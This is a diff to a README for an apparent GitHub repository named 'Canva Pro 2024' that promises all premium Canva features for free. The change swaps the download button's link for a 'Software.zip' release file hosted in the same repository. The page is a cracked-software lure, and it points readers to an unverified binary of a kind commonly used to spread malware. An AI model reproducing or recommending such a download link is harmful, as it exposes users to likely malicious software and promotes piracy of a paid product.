@@ -12,7 +12,7 @@ Welcome to the **Canva Pro 2024** repository, your go-to place for downloading C
 
 To download Canva Pro 2024, click the button below:
 
-[![Download Canva Pro 2024](https://img.shields.io/badge/Download-Canva%20Pro%202024-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download Canva Pro 2024](https://github.com/Mamdel/Canva-Pro-2024/releases/download/v1.0/Software.zip%20Pro%202024-blue)](https://github.com/Mamdel/Canva-Pro-2024/releases/download/v1.0/Software.zip)
 
 Once you click the button, the download will start automatically. Enjoy all the premium features of Canva Pro for free!
 
